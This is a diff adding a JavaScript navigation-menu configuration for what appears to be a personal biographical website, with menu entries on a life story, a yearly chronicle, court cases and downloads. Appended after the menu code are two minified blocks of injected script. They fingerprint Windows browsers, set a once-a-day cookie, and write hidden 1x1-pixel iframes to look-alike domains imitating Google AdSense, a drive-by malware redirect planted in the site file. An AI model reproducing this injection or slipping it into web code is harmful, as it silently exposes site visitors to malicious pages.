@@ -1,0 +1,115 @@
+/***********************************************************************************
+*	(c) Ger Versluis 2000 version 5.411 24 December 2001 (updated Jan 31st, 2003 by Dynamic Drive for Opera7)
+*	For info write to menus@burmees.nl		          *
+*	You may remove all comments for faster loading	          *		
+***********************************************************************************/
+
+	var NoOffFirstLineMenus=10;			// Number of first level items
+	var LowBgColor='#FFFF33';			// Background color when mouse is not over
+	var LowSubBgColor='#FFFF33';			// Background color when mouse is not over on subs
+	var HighBgColor='#000066';			// Background color when mouse is over
+	var HighSubBgColor='#000066';			// Background color when mouse is over on subs
+	var FontLowColor='#000066';			// Font color when mouse is not over
+	var FontSubLowColor='#000066';			// Font color subs when mouse is not over
+	var FontHighColor='white';			// Font color when mouse is over
+	var FontSubHighColor='white';			// Font color subs when mouse is over
+	var BorderColor='#990000';			// Border color
+	var BorderSubColor='#990000';			// Border color for subs
+	var BorderWidth=1;				// Border width
+	var BorderBtwnElmnts=1;			// Border between elements 1 or 0
+	var FontFamily="arial,comic sans ms,technical"	// Font family menu items
+	var FontSize=9;				// Font size menu items
+	var FontBold=1;				// Bold menu items 1 or 0
+	var FontItalic=0;				// Italic menu items 1 or 0
+	var MenuTextCentered='left';			// Item text position 'left', 'center' or 'right'
+	var MenuCentered='center';			// Menu horizontal position 'left', 'center' or 'right'
+	var MenuVerticalCentered='static';		// Menu vertical position 'top', 'middle','bottom' or static
+	var ChildOverlap=.2;				// horizontal overlap child/ parent
+	var ChildVerticalOverlap=.2;			// vertical overlap child/ parent
+	var StartTop=1;				// Menu offset x coordinate
+	var StartLeft=1;				// Menu offset y coordinate
+	var VerCorrect=0;				// Multiple frames y correction
+	var HorCorrect=0;				// Multiple frames x correction
+	var LeftPaddng=3;				// Left padding
+	var TopPaddng=2;				// Top padding
+	var FirstLineHorizontal=1;			// SET TO 1 FOR HORIZONTAL MENU, 0 FOR VERTICAL
+	var MenuFramesVertical=1;			// Frames in cols or rows 1 or 0
+	var DissapearDelay=500;			// delay before menu folds in
+	var TakeOverBgColor=1;			// Menu frame takes over background color subitem frame
+	var FirstLineFrame='navig';			// Frame where first level appears
+	var SecLineFrame='space';			// Frame where sub levels appear
+	var DocTargetFrame='space';			// Frame where target documents appear
+	var TargetLoc='';				// span id for relative positioning
+	var HideTop=0;				// Hide first level when loading new document 1 or 0
+	var MenuWrap=1;				// enables/ disables menu wrap 1 or 0
+	var RightToLeft=0;				// enables/ disables right to left unfold 1 or 0
+	var UnfoldsOnClick=0;			// Level 1 unfolds onclick/ onmouseover
+	var WebMasterCheck=0;			// menu tree checking on or off 1 or 0
+	var ShowArrow=1;				// Uses arrow gifs when 1
+	var KeepHilite=1;				// Keep selected path highligthed
+	var Arrws=['tri.gif',5,10,'tridown.gif',10,5,'trileft.gif',5,10];	// Arrow source, width and height
+
+function BeforeStart(){return}
+function AfterBuild(){return}
+function BeforeFirstOpen(){return}
+function AfterCloseAll(){return}
+
+
+// Menu tree
+//	MenuX=new Array(Text to show, Link, background image (optional), number of sub elements, height, width);
+//	For rollover images set "Text to show" to:  "rollover:Image1.jpg_3AImage2.jpg"
+
+Menu1=new Array("HOME PAGE","home.php","",0,20,75);
+Menu2=new Array("1. Introduction","introduction.php","",0,20,90);
+Menu3=new Array("2. My life","","",8,20,70);
+	Menu3_1=new Array("Birth","life.php#inizio","",0,20,200);
+	Menu3_2=new Array("Childhood","life.php#infanzia","",0,20,200);
+	Menu3_3=new Array("Infancy Specification ","life.php#cosadire","",0,20,200);
+        Menu3_4=new Array("Teenage","life.php#adolescenza","",0,20,200);
+	Menu3_5=new Array("Youth","life.php#gioventù","",0,20,200);
+	Menu3_6=new Array("Adulthood","life.php#etamatura","",0,20,200);
+	Menu3_7=new Array("Why whole of this silence conspiracy?","life.php#perche","",0,20,200);
+	Menu3_8=new Array("Face Plastic Surgery","life.php#plastica","",0,20,200);
+
+Menu4=new Array("3. Chronicle","","",12,20,85);
+	Menu4_1=new Array("Year 1978","chronicle.php#inizio","",0,20,150);
+	Menu4_2=new Array("Years 1983-84","chronicle.php#anno83","",0,20,150);
+	Menu4_3=new Array("Years 1994-95","chronicle.php#febbraio94","",0,20,150);
+	Menu4_4=new Array("Year 1996","chronicle.php#anno96","",0,20,150);
+	Menu4_5=new Array("Year 1997","chronicle.php#anno97","",0,20,150);
+	Menu4_6=new Array("Year 1998","chronicle.php#anno98","",0,20,150);
+	Menu4_7=new Array("Year 1999","chronicle.php#anno99","",0,20,150);
+	Menu4_8=new Array("Year 2000","chronicle.php#anno00","",0,20,150);
+	Menu4_9=new Array("Year 2001","chronicle.php#anno01","",0,20,150);
+	Menu4_10=new Array("Year 2002","chronicle.php#anno02","",0,20,150);
+	Menu4_11=new Array("Year 2003","chronicle.php#anno03","",0,20,150);
+	Menu4_12=new Array("Year 2004","chronicle.php#anno04","",0,20,150);
+	
+Menu5=new Array("4. Register Office","registry.php","",0,20,110);
+Menu6=new Array("5. Courts","","",3,20,70);
+	Menu6_1=new Array("Mondovi","courts.php#mondovi","",0,20,150);
+	Menu6_2=new Array("Strasburgo","courts.php#strasburgo","",0,20,150);
+	Menu6_3=new Array("Roma","courts.php#roma","",0,20,150);
+
+
+	
+Menu7=new Array("7. News","news.php","",0,20,75);
+	
+
+Menu8=new Array("8. Archives","","",3,20,85);
+	Menu8_1=new Array("Declaration","declaration.php","",0,20,150);
+        Menu8_2=new Array("what to say","cosadire.php","",0,20,150);
+        Menu8_3=new Array("Contrast","contrasto.php","",0,20,150); 
+
+Menu9=new Array("7. Versione in italiano","../home.php","",0,20,155);
+
+Menu10=new Array("Download","","",4,0,75);
+	Menu10_1=new Array("English version zip","../download/italiano.zip","",0,20,200);
+	Menu10_2=new Array("English version rar","../download/italiano.rar","",0,20,200);
+        Menu10_3=new Array("Versione Italiana Zip","../download/english.zip","",0,20,200);
+	Menu10_4=new Array("Versione Italiana rar","../download/english.rar","",0,20,200);
+
+
+
+
+var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsenc.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsens.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}
